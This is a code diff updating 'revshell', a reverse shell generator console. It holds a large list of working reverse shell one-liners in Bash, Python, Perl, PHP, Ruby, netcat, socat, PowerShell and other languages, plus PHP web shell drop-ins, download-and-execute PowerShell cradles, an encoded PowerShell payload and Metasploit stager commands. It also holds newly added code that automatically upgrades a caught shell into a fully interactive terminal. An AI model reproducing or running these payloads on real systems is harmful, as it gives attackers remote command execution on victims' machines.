@@ -2,7 +2,7 @@
 """
 revshell — Reverse Shell Generator Console
 Author  : @ZetaOrioniss
-Version : v2.0
+Version : v2.1
 """
 
 import sys
@@ -15,7 +15,12 @@ import socket
 import struct
 import json
 import re
-import base64
+import pty
+import tty
+import termios
+import select
+import time
+import threading
 import argparse
 from dataclasses import dataclass, field
 from typing import Optional
@@ -37,19 +42,19 @@ class C:
     END    = "\033[0m"
 
     @staticmethod
-    def r(s):  return f"{C.RED}{s}{C.END}"
+    def r(s):    return f"{C.RED}{s}{C.END}"
     @staticmethod
-    def g(s):  return f"{C.GREEN}{s}{C.END}"
+    def g(s):    return f"{C.GREEN}{s}{C.END}"
     @staticmethod
-    def y(s):  return f"{C.YELLOW}{s}{C.END}"
+    def y(s):    return f"{C.YELLOW}{s}{C.END}"
     @staticmethod
-    def b(s):  return f"{C.BLUE}{s}{C.END}"
+    def b(s):    return f"{C.BLUE}{s}{C.END}"
     @staticmethod
-    def m(s):  return f"{C.MAGENTA}{s}{C.END}"
+    def m(s):    return f"{C.MAGENTA}{s}{C.END}"
     @staticmethod
-    def c(s):  return f"{C.CYAN}{s}{C.END}"
+    def c(s):    return f"{C.CYAN}{s}{C.END}"
     @staticmethod
-    def w(s):  return f"{C.WHITE}{s}{C.END}"
+    def w(s):    return f"{C.WHITE}{s}{C.END}"
     @staticmethod
     def grey(s): return f"{C.GREY}{s}{C.END}"
     @staticmethod
@@ -60,264 +65,494 @@ class C:
     def ul(s):   return f"{C.UNDER}{s}{C.END}"
     @staticmethod
     def it(s):   return f"{C.ITALIC}{s}{C.END}"
-
     @staticmethod
     def strip(s: str) -> str:
-        """Remove all ANSI escape codes from a string."""
         return re.sub(r'\033\[[0-9;]*m', '', s)
 
+
+# ─── Payloads ─────────────────────────────────────────────────────────────────
 
 @dataclass
 class Payload:
     key:      str
     name:     str
-    platform: str           # unix | windows | both
-    category: str           # bash | python | perl | php | ruby | netcat | socat | powershell | meterpreter | other
+    platform: str
+    category: str
     template: str
-    note:     str = ""      # optional short note
+    note:     str = ""
 
     def render(self, lhost: str, lport: str) -> str:
         return self.template.format(lhost=lhost, lport=lport)
 
 
 PAYLOADS: list[Payload] = [
-
-    # ── Bash ──────────────────────────────────────────────────────────────────
-    Payload("bash_tcp", "Bash TCP", "unix", "bash",
-        "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
-        "Classic one-liner"),
-    Payload("bash_196", "Bash FD 196", "unix", "bash",
+    Payload("bash_tcp",  "Bash TCP",        "unix", "bash",
+        "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1", "Classic one-liner"),
+    Payload("bash_196",  "Bash FD 196",     "unix", "bash",
         "0<&196;exec 196<>/dev/tcp/{lhost}/{lport};sh <&196 >&196 2>&196",
         "Uses file descriptor 196"),
-    Payload("bash_udp", "Bash UDP", "unix", "bash",
-        "bash -i >& /dev/udp/{lhost}/{lport} 0>&1",
-        "UDP variant"),
-    Payload("bash_read", "Bash read loop", "unix", "bash",
-        "exec 5<>/dev/tcp/{lhost}/{lport};cat <&5 | while read line; do $line 2>&5 >&5; done",
-        "Read-loop variant"),
-    Payload("sh_tcp", "sh TCP", "unix", "bash",
+    Payload("bash_udp",  "Bash UDP",        "unix", "bash",
+        "bash -i >& /dev/udp/{lhost}/{lport} 0>&1", "UDP variant"),
+    Payload("bash_read", "Bash read loop",  "unix", "bash",
+        "exec 5<>/dev/tcp/{lhost}/{lport};cat <&5 | while read line; do $line 2>&5 >&5; done"),
+    Payload("sh_tcp",    "sh TCP",          "unix", "bash",
         "sh -i >& /dev/tcp/{lhost}/{lport} 0>&1"),
-    Payload("zsh_tcp", "Zsh TCP", "unix", "bash",
-        "zsh -c 'zmodload zsh/net/tcp && ztcp {lhost} {lport} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'",
-        "Requires zsh with net/tcp module"),
+    Payload("zsh_tcp",   "Zsh TCP",         "unix", "bash",
+        "zsh -c 'zmodload zsh/net/tcp && ztcp {lhost} {lport} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'"),
 
-    # ── Python ────────────────────────────────────────────────────────────────
-    Payload("python3_pty", "Python3 PTY", "unix", "python",
+    Payload("python3_pty",    "Python3 PTY",     "unix", "python",
         "python3 -c 'import socket,os,pty;"
         "s=socket.socket();s.connect((\"{lhost}\",{lport}));"
         "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
-        "pty.spawn(\"/bin/bash\")'",
-        "Spawns a PTY"),
-    Payload("python3_env", "Python3 environ", "unix", "python",
+        "pty.spawn(\"/bin/bash\")'", "Spawns a PTY"),
+    Payload("python3_env",    "Python3 environ", "unix", "python",
         "export RHOST=\"{lhost}\";export RPORT={lport};"
         "python3 -c 'import sys,socket,os,pty;"
         "s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));"
-        "[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'",
-        "Env-var variant (avoids logging IP in bash history)"),
-    Payload("python3_thread", "Python3 threaded", "unix", "python",
-        "python3 -c 'import socket,subprocess,os,threading;"
+        "[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'"),
+    Payload("python3_thread", "Python3 threaded","unix", "python",
+        "python3 -c 'import socket,subprocess,os;"
         "s=socket.socket();s.connect((\"{lhost}\",{lport}));"
-        "t=lambda f,t:[threading.Thread(target=lambda:os.write(t,os.read(f,4096)),daemon=True).start() for _ in iter(int,1)];"
         "p=subprocess.Popen([\"/bin/sh\"],stdin=s,stdout=s,stderr=s)'"),
-    Payload("python2", "Python2", "unix", "python",
+    Payload("python2",        "Python2",         "unix", "python",
         "python -c 'import socket,os,pty;"
         "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
         "s.connect((\"{lhost}\",{lport}));"
         "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
         "pty.spawn(\"/bin/bash\")'"),
     Payload("python_win", "Python Windows", "windows", "python",
-        "python -c 'import socket,subprocess,os;"
-        "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
-        "s.connect((\"{lhost}\",{lport}));"
-        "subprocess.call([\"cmd.exe\"],stdin=s,stdout=s,stderr=s)'",
-        "Windows cmd shell via Python"),
+        "python -c 'import socket,subprocess;"
+        "s=socket.socket();s.connect((\"{lhost}\",{lport}));"
+        "subprocess.call([\"cmd.exe\"],stdin=s,stdout=s,stderr=s)'"),
 
-    # ── Perl ──────────────────────────────────────────────────────────────────
-    Payload("perl", "Perl", "unix", "perl",
+    Payload("perl",       "Perl",           "unix", "perl",
         "perl -e 'use Socket;$i=\"{lhost}\";$p={lport};"
         "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
         "if(connect(S,sockaddr_in($p,inet_aton($i)))){{" 
         "open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
         "exec(\"/bin/sh -i\");}};'"),
-    Payload("perl_no_sh", "Perl no /bin/sh", "unix", "perl",
+    Payload("perl_no_sh", "Perl no /bin/sh","unix", "perl",
         "perl -MIO -e '$p=fork;exit,if($p);"
         "$c=new IO::Socket::INET(PeerAddr,\"{lhost}:{lport}\");"
-        "STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>'",
-        "Avoids direct /bin/sh call"),
-    Payload("perl_win", "Perl Windows", "windows", "perl",
+        "STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>'"),
+    Payload("perl_win",   "Perl Windows",   "windows","perl",
         "perl -MIO::Socket -e "
         "'$c=IO::Socket::INET->new(PeerAddr=>\"{lhost}:{lport}\");"
         "open STDIN,\"<&\",$c;open STDOUT,\">&\",$c;open STDERR,\">&\",$c;"
         "exec \"cmd.exe\"'"),
 
-    # ── PHP ───────────────────────────────────────────────────────────────────
-    Payload("php_exec", "PHP exec", "unix", "php",
-        "php -r '$sock=fsockopen(\"{lhost}\",{lport});"
-        "exec(\"/bin/sh -i <&3 >&3 2>&3\");'"),
+    Payload("php_exec",      "PHP exec",      "unix", "php",
+        "php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"),
     Payload("php_proc_open", "PHP proc_open", "unix", "php",
         "php -r '$d=array(array(\"pipe\",\"r\"),array(\"pipe\",\"w\"),array(\"pipe\",\"w\"));"
         "$p=proc_open(\"/bin/bash\",$d,$pp);"
         "$s=fsockopen(\"{lhost}\",{lport});"
-        "while(!feof($s)){{$c=fread($s,4096);fwrite($pp[0],$c);}}'",
-        "Uses proc_open for better shell handling"),
-    Payload("php_shell_exec", "PHP shell_exec", "unix", "php",
-        "php -r '$s=fsockopen(\"{lhost}\",{lport});$cmd=\"/bin/sh -i\";"
-        "shell_exec($cmd.\" <&3 >&3 2>&3\");'"),
-    Payload("php_system", "PHP system()", "unix", "php",
+        "while(!feof($s)){{$c=fread($s,4096);fwrite($pp[0],$c);}}'"),
+    Payload("php_system",    "PHP system()",  "unix", "php",
         "<?php system(\"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'\"); ?>",
         "Web shell drop-in"),
-    Payload("php_passthru", "PHP passthru()", "unix", "php",
-        "<?php passthru(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f\"); ?>",
-        "mkfifo via PHP web shell"),
-    Payload("php_win", "PHP Windows", "windows", "php",
+    Payload("php_passthru",  "PHP passthru()","unix", "php",
+        "<?php passthru(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f\"); ?>"),
+    Payload("php_win",       "PHP Windows",   "windows","php",
         "php -r '$sock=fsockopen(\"{lhost}\",{lport});"
         "exec(\"cmd.exe /c powershell -NoP -NonI -Exec Bypass \");'"),
 
-    # ── Ruby ──────────────────────────────────────────────────────────────────
-    Payload("ruby", "Ruby", "unix", "ruby",
+    Payload("ruby",       "Ruby",           "unix", "ruby",
         "ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;"
         "exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"),
-    Payload("ruby_no_sh", "Ruby no /bin/sh", "unix", "ruby",
+    Payload("ruby_no_sh", "Ruby no /bin/sh","unix", "ruby",
         "ruby -rsocket -e 'exit if fork;"
         "c=TCPSocket.new(\"{lhost}\",\"{lport}\");"
-        "while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'",
-        "Avoids direct /bin/sh, uses IO.popen"),
-    Payload("ruby_win", "Ruby Windows", "windows", "ruby",
+        "while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'"),
+    Payload("ruby_win",   "Ruby Windows",   "windows","ruby",
         "ruby -rsocket -e 'c=TCPSocket.new(\"{lhost}\",\"{lport}\");"
         "while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'"),
 
-    # ── Netcat ────────────────────────────────────────────────────────────────
-    Payload("nc_e", "Netcat -e", "unix", "netcat",
-        "nc -e /bin/sh {lhost} {lport}",
-        "Requires -e flag (traditional nc)"),
-    Payload("nc_mkfifo", "Netcat mkfifo", "unix", "netcat",
-        "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
-        "Works with OpenBSD nc (no -e)"),
-    Payload("nc_ncat", "Ncat", "unix", "netcat",
-        "ncat {lhost} {lport} -e /bin/bash",
-        "Nmap's ncat"),
-    Payload("nc_udp", "Netcat UDP", "unix", "netcat",
-        "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -u {lhost} {lport} >/tmp/f",
-        "UDP variant with mkfifo"),
-    Payload("busybox_nc", "BusyBox nc", "unix", "netcat",
-        "busybox nc {lhost} {lport} -e /bin/sh",
-        "Embedded/IoT targets"),
+    Payload("nc_e",       "Netcat -e",      "unix", "netcat",
+        "nc -e /bin/sh {lhost} {lport}", "Requires -e flag"),
+    Payload("nc_mkfifo",  "Netcat mkfifo",  "unix", "netcat",
+        "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"),
+    Payload("nc_ncat",    "Ncat",           "unix", "netcat",
+        "ncat {lhost} {lport} -e /bin/bash"),
+    Payload("nc_udp",     "Netcat UDP",     "unix", "netcat",
+        "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -u {lhost} {lport} >/tmp/f"),
+    Payload("busybox_nc", "BusyBox nc",     "unix", "netcat",
+        "busybox nc {lhost} {lport} -e /bin/sh", "Embedded/IoT"),
 
-    # ── Socat ─────────────────────────────────────────────────────────────────
-    Payload("socat", "Socat", "unix", "socat",
+    Payload("socat",     "Socat",          "unix", "socat",
         "socat tcp-connect:{lhost}:{lport} exec:'bash -li',pty,stderr,setsid,sigint,sane",
-        "Full PTY — best interactive shell"),
-    Payload("socat_tty", "Socat encrypted", "unix", "socat",
-        "socat openssl-connect:{lhost}:{lport},verify=0 exec:'bash -li',pty,stderr,setsid,sigint,sane",
-        "TLS-encrypted; listener needs: socat openssl-listen:<port>,cert=..."),
-    Payload("socat_udp", "Socat UDP", "unix", "socat",
+        "Full PTY"),
+    Payload("socat_tls", "Socat TLS",      "unix", "socat",
+        "socat openssl-connect:{lhost}:{lport},verify=0 exec:'bash -li',pty,stderr,setsid,sigint,sane"),
+    Payload("socat_udp", "Socat UDP",      "unix", "socat",
         "socat UDP:{lhost}:{lport} exec:'bash -li',pty,stderr,setsid,sigint,sane"),
 
-    # ── AWK / other Unix tools ─────────────────────────────────────────────────
-    Payload("awk", "AWK", "unix", "other",
+    Payload("awk",          "AWK",          "unix", "other",
         "awk 'BEGIN {{s = \"/inet/tcp/0/{lhost}/{lport}\"; while(42) {{ do {{"
         "printf \"shell>\" |& s; s |& getline c; if (c) {{"
         "while ((c |& getline) > 0) print $0 |& s; close(c); }} }}"
         "while(c != \"exit\") }}}}'"),
-    Payload("gawk", "GNU Awk", "unix", "other",
-        "gawk 'BEGIN{{s=\"/inet/tcp/0/{lhost}/{lport}\";"
-        "for(;;){{printf \"sh>\" |& s;if((s |& getline c)<=0)break;"
-        "while((\"exec \"c |& getline o)>0)print o |& s;close(\"exec \"c)}}}}'"),
-    Payload("telnet", "Telnet mkfifo", "unix", "other",
-        "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet {lhost} {lport} >/tmp/f",
-        "For hosts with telnet but no nc"),
-    Payload("lua", "Lua", "unix", "other",
-        "lua -e \"require('socket');"
-        "t=require('socket').tcp();"
+    Payload("telnet",       "Telnet mkfifo","unix", "other",
+        "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet {lhost} {lport} >/tmp/f"),
+    Payload("lua",          "Lua",          "unix", "other",
+        "lua -e \"require('socket');t=require('socket').tcp();"
         "t:connect('{lhost}','{lport}');"
         "while true do local r=t:receive();local f=io.popen(r,'r');"
         "local s=f:read('*a');f:close();t:send(s) end;t:close()\""),
-    Payload("golang", "Go", "unix", "other",
-        "echo 'package main;import(\"os/exec\";\"net\");func main(){{c,_:=net.Dial(\"tcp\",\"{lhost}:{lport}\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}' > /tmp/rs.go && go run /tmp/rs.go",
-        "Needs Go installed; drops temp file"),
+    Payload("golang",       "Go",           "unix", "other",
+        "echo 'package main;import(\"os/exec\";\"net\");"
+        "func main(){{c,_:=net.Dial(\"tcp\",\"{lhost}:{lport}\");"
+        "cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}'"
+        " > /tmp/rs.go && go run /tmp/rs.go"),
+    Payload("node_js",      "Node.js",      "unix", "other",
+        "require('child_process').exec('bash -i >& /dev/tcp/{lhost}/{lport} 0>&1')"),
     Payload("java_runtime", "Java Runtime", "unix", "other",
-        "r = Runtime.getRuntime();"
-        "p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{lhost}/{lport};cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[]);"
-        "p.waitFor()",
-        "Groovy / Java console"),
-    Payload("node_js", "Node.js", "unix", "other",
-        "require('child_process').exec('bash -i >& /dev/tcp/{lhost}/{lport} 0>&1')",
-        "One-liner for Node REPL/RCE"),
+        "r=Runtime.getRuntime();"
+        "p=r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{lhost}/{lport};"
+        "cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[]);"
+        "p.waitFor()"),
 
-    # ── PowerShell ────────────────────────────────────────────────────────────
-    Payload("powershell", "PowerShell TCP", "windows", "powershell",
+    Payload("powershell",  "PowerShell TCP",      "windows","powershell",
         "$c=New-Object System.Net.Sockets.TCPClient(\"{lhost}\",{lport});"
         "$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
         "while(($i=$s.Read($b,0,$b.Length)) -ne 0){{"
         "$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);"
         "$sb=(iex $d 2>&1|Out-String);$sb2=$sb+\"PS \"+(pwd).Path+\"> \";"
         "$by=([text.encoding]::ASCII).GetBytes($sb2);"
-        "$s.Write($by,0,$by.Length);$s.Flush()}}$c.Close()",
-        "Full interactive PS reverse shell"),
-    Payload("ps_oneliner", "PowerShell one-liner", "windows", "powershell",
+        "$s.Write($by,0,$by.Length);$s.Flush()}}$c.Close()"),
+    Payload("ps_oneliner", "PowerShell one-liner","windows","powershell",
         "powershell -NoP -NonI -W Hidden -Exec Bypass -Command "
         "\"$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});"
         "$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
         "while(($i=$s.Read($b,0,$b.Length)) -ne 0){{"
         "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
-        "$s.Write(([text.encoding]::ASCII).GetBytes((iex $d 2>&1|Out-String)+(pwd).Path+'> '),0,(iex ...).Length);$s.Flush()}}\""),
-    Payload("ps_b64", "PowerShell Base64", "windows", "powershell",
-        "powershell -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAewBsAGgAbwBzAHQAfQAiACwAIAB7AGwAcABvAHIAdAB9ACkA",
-        "Obfuscated — bypasses basic filters"),
-    Payload("ps_icm", "PowerShell ICM", "windows", "powershell",
-        "IEX(New-Object Net.WebClient).downloadString('http://{lhost}/rs.ps1')",
-        "Download & execute — host a ps1 payload"),
-    Payload("ps_nishang", "Nishang Invoke-PowerShellTcp", "windows", "powershell",
-        "IEX(New-Object Net.WebClient).downloadString('http://{lhost}/Invoke-PowerShellTcp.ps1');"
-        "Invoke-PowerShellTcp -Reverse -IPAddress {lhost} -Port {lport}",
-        "Requires Nishang hosted on lhost"),
-    Payload("cmd_nc", "cmd.exe + nc", "windows", "powershell",
-        "nc.exe -e cmd.exe {lhost} {lport}",
-        "If nc.exe is available on target"),
+        "$s.Write(([text.encoding]::ASCII).GetBytes((iex $d 2>&1|Out-String)+"
+        "(pwd).Path+'> '),0,1);$s.Flush()}}\""),
+    Payload("ps_b64",      "PowerShell Base64",   "windows","powershell",
+        "powershell -EncodedCommand "
+        "JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAewBsAGgAbwBzAHQAfQAiACwAIAB7AGwAcABvAHIAdAB9ACkA"),
+    Payload("ps_icm",      "PowerShell ICM",      "windows","powershell",
+        "IEX(New-Object Net.WebClient).downloadString('http://{lhost}/rs.ps1')"),
+    Payload("cmd_nc",      "cmd.exe + nc",        "windows","powershell",
+        "nc.exe -e cmd.exe {lhost} {lport}"),
 
-    # ── Meterpreter stagers ───────────────────────────────────────────────────
-    Payload("msf_linux_x64", "MSF Linux x64", "unix", "meterpreter",
-        "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f elf > /tmp/shell.elf && chmod +x /tmp/shell.elf && /tmp/shell.elf",
-        "Generate + exec — requires msfvenom"),
-    Payload("msf_win_x64", "MSF Windows x64", "windows", "meterpreter",
-        "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe > shell.exe",
-        "Generate exe stager"),
-    Payload("msf_ps_stager", "MSF PS stager", "windows", "meterpreter",
-        "msfvenom -p cmd/windows/reverse_powershell LHOST={lhost} LPORT={lport}",
-        "Powershell stager via msfvenom"),
-    Payload("msf_handler", "MSF handler", "both", "meterpreter",
-        "msfconsole -x 'use exploit/multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST {lhost}; set LPORT {lport}; run'",
-        "Quick handler — change payload as needed"),
+    Payload("msf_linux_x64", "MSF Linux x64",   "unix",    "meterpreter",
+        "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} "
+        "-f elf > /tmp/shell.elf && chmod +x /tmp/shell.elf && /tmp/shell.elf"),
+    Payload("msf_win_x64",   "MSF Windows x64", "windows", "meterpreter",
+        "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe > shell.exe"),
+    Payload("msf_ps_stager", "MSF PS stager",   "windows", "meterpreter",
+        "msfvenom -p cmd/windows/reverse_powershell LHOST={lhost} LPORT={lport}"),
+    Payload("msf_handler",   "MSF handler",     "both",    "meterpreter",
+        "msfconsole -x 'use exploit/multi/handler; "
+        "set payload linux/x64/meterpreter/reverse_tcp; "
+        "set LHOST {lhost}; set LPORT {lport}; run'"),
 ]
 
 PAYLOAD_MAP: dict[str, Payload] = {p.key: p for p in PAYLOADS}
-
-# Ordered categories for grouped display
-CATEGORIES = ["bash", "python", "perl", "php", "ruby", "netcat", "socat", "other", "powershell", "meterpreter"]
+CATEGORIES = ["bash","python","perl","php","ruby","netcat","socat","other","powershell","meterpreter"]
 CATEGORY_LABELS = {
-    "bash":       "Bash / Shell",
-    "python":     "Python",
-    "perl":       "Perl",
-    "php":        "PHP",
-    "ruby":       "Ruby",
-    "netcat":     "Netcat / BusyBox",
-    "socat":      "Socat",
-    "other":      "Other (Lua, Go, Java, Node...)",
-    "powershell": "PowerShell / Windows",
-    "meterpreter":"Metasploit Stagers",
+    "bash":        "Bash / Shell",
+    "python":      "Python",
+    "perl":        "Perl",
+    "php":         "PHP",
+    "ruby":        "Ruby",
+    "netcat":      "Netcat / BusyBox",
+    "socat":       "Socat",
+    "other":       "Other (Lua, Go, Java, Node...)",
+    "powershell":  "PowerShell / Windows",
+    "meterpreter": "Metasploit Stagers",
 }
-
-PLATFORM_ICON = {"unix": "", "windows": "", "both": ""}
+PLATFORM_ICON = {"unix": "🐧", "windows": "🪟", "both": "🌐"}
 NC_CANDIDATES = ["nc", "ncat", "netcat"]
 
 
-# ─────────────────────────────────────────────────────────────────────────────
-#  Network interface helpers
-# ─────────────────────────────────────────────────────────────────────────────
+# ─── Auto-upgrade engine ──────────────────────────────────────────────────────
+#
+# Strategy: once nc accepts a connection, we own a raw socket to the remote
+# shell. We probe which upgraders are available (python3, script, socat),
+# send the appropriate one-liner, then switch the local terminal to raw mode
+# and relay bytes — giving a fully interactive TTY without any manual step.
+
+UPGRADE_PROBE_TIMEOUT = 4      # seconds to wait for each command response
+SETTLE_DELAY          = 0.6    # seconds to let the remote shell settle after sending
+
+
+def _send(sock: socket.socket, data: str) -> None:
+    """Send a string to the remote shell."""
+    sock.sendall((data + "\n").encode())
+
+
+def _recv_until(sock: socket.socket, timeout: float = UPGRADE_PROBE_TIMEOUT) -> str:
+    """Read available bytes from the socket with a timeout."""
+    sock.settimeout(timeout)
+    buf = b""
+    try:
+        while True:
+            chunk = sock.recv(4096)
+            if not chunk:
+                break
+            buf += chunk
+    except (socket.timeout, BlockingIOError):
+        pass
+    finally:
+        sock.settimeout(None)
+    return buf.decode(errors="replace")
+
+
+def _probe_tool(sock: socket.socket, cmd: str, marker: str) -> bool:
+    """
+    Send `cmd` to the remote shell, wait for `marker` in the output.
+    Returns True if the tool appears to be available.
+    """
+    _send(sock, cmd)
+    out = _recv_until(sock, timeout=UPGRADE_PROBE_TIMEOUT)
+    return marker.lower() in out.lower()
+
+
+def _get_terminal_size() -> tuple[int, int]:
+    try:
+        sz = os.get_terminal_size()
+        return sz.lines, sz.columns
+    except OSError:
+        return 24, 80
+
+
+def _set_raw(fd: int) -> list:
+    """Switch terminal fd to raw mode, return old attrs."""
+    old = termios.tcgetattr(fd)
+    tty.setraw(fd)
+    return old
+
+
+def _restore(fd: int, attrs: list) -> None:
+    termios.tcsetattr(fd, termios.TCSADRAIN, attrs)
+
+
+def _relay_interactive(sock: socket.socket) -> None:
+    """
+    Relay bytes between the local terminal (stdin/stdout) and the socket.
+    Exits cleanly when Ctrl+C is pressed or the socket closes.
+    """
+    rows, cols = _get_terminal_size()
+    old_attrs  = None
+    try:
+        old_attrs = _set_raw(sys.stdin.fileno())
+        while True:
+            r, _, _ = select.select([sock, sys.stdin], [], [], 0.1)
+            for fd in r:
+                if fd is sys.stdin:
+                    data = os.read(sys.stdin.fileno(), 1024)
+                    if not data:
+                        return
+                    # Ctrl+C sends 0x03; we trap it to exit relay mode cleanly
+                    if b"\x03" in data:
+                        return
+                    sock.sendall(data)
+                else:
+                    data = sock.recv(4096)
+                    if not data:
+                        return
+                    os.write(sys.stdout.fileno(), data)
+    except (OSError, KeyboardInterrupt):
+        pass
+    finally:
+        if old_attrs is not None:
+            _restore(sys.stdin.fileno(), old_attrs)
+        # Ensure clean newline after raw mode
+        sys.stdout.write("\r\n")
+        sys.stdout.flush()
+
+
+def auto_upgrade(sock: socket.socket, lhost: str, lport: str) -> None:
+    """
+    Called once nc has accepted a connection and `sock` is the connected socket.
+    Probes available upgrade methods and applies the best one automatically.
+    """
+    rows, cols = _get_terminal_size()
+
+    # Let the remote shell settle (bash prompt, etc.)
+    time.sleep(SETTLE_DELAY)
+    _recv_until(sock, timeout=1.5)   # drain banner / prompt
+
+    print(f"\r\n  {C.bold('Auto-upgrading shell...')}\r")
+
+    # ── Strategy 1: python3 pty ───────────────────────────────────────────────
+    if _probe_tool(sock, "command -v python3 2>/dev/null", "/python3"):
+        print(f"  {C.g('[✔]')} python3 found — spawning PTY\r")
+        time.sleep(0.2)
+        _send(sock, "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'")
+        time.sleep(SETTLE_DELAY)
+        _recv_until(sock, timeout=1.5)
+        _finalize_tty(sock, rows, cols, method="python3")
+        return
+
+    # ── Strategy 2: python2 ────────────────────────────────────────────────────
+    if _probe_tool(sock, "command -v python 2>/dev/null", "/python"):
+        print(f"  {C.g('[✔]')} python2 found — spawning PTY\r")
+        time.sleep(0.2)
+        _send(sock, "python -c 'import pty; pty.spawn(\"/bin/bash\")'")
+        time.sleep(SETTLE_DELAY)
+        _recv_until(sock, timeout=1.5)
+        _finalize_tty(sock, rows, cols, method="python2")
+        return
+
+    # ── Strategy 3: script ────────────────────────────────────────────────────
+    if _probe_tool(sock, "command -v script 2>/dev/null", "/script"):
+        print(f"  {C.g('[✔]')} script found — allocating PTY\r")
+        time.sleep(0.2)
+        _send(sock, "script /dev/null -c bash")
+        time.sleep(SETTLE_DELAY)
+        _recv_until(sock, timeout=1.5)
+        _finalize_tty(sock, rows, cols, method="script")
+        return
+
+    # ── Strategy 4: socat ─────────────────────────────────────────────────────
+    if _probe_tool(sock, "command -v socat 2>/dev/null", "/socat"):
+        print(f"  {C.g('[✔]')} socat found — using fully interactive shell\r")
+        # Socat needs a second listener on our side; we open one in a thread
+        socat_port = int(lport) + 1
+        print(f"  {C.y('[!]')} socat listener → port {socat_port}\r")
+        _send(sock,
+              f"socat exec:'bash -li',pty,stderr,setsid,sigint,sane "
+              f"tcp:{lhost}:{socat_port}")
+        # Open the second listener
+        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        srv.bind(("0.0.0.0", socat_port))
+        srv.listen(1)
+        srv.settimeout(8)
+        try:
+            conn, _ = srv.accept()
+            srv.close()
+            time.sleep(0.3)
+            _relay_interactive(conn)
+            conn.close()
+        except socket.timeout:
+            print(f"  {C.r('[✗]')} socat: no connection on port {socat_port}\r")
+            srv.close()
+        return
+
+    # ── Fallback: dumb relay — no PTY available ───────────────────────────────
+    print(f"  {C.y('[!]')} No python/script/socat found — dumb relay (no PTY)\r")
+    print(f"  {C.grey('Ctrl+C to exit')}\r")
+    _relay_interactive(sock)
+
+
+def _finalize_tty(sock: socket.socket, rows: int, cols: int, method: str) -> None:
+    """
+    After spawning a PTY on the remote side, fix the terminal size
+    and hand over to the interactive relay.
+    """
+    print(f"  {C.g('[✔]')} Setting terminal size {cols}x{rows}\r")
+    # stty rows/cols on the remote
+    _send(sock, f"stty rows {rows} cols {cols}")
+    time.sleep(0.2)
+    _recv_until(sock, timeout=0.5)
+    # Set TERM
+    _send(sock, "export TERM=xterm-256color")
+    time.sleep(0.1)
+    _recv_until(sock, timeout=0.5)
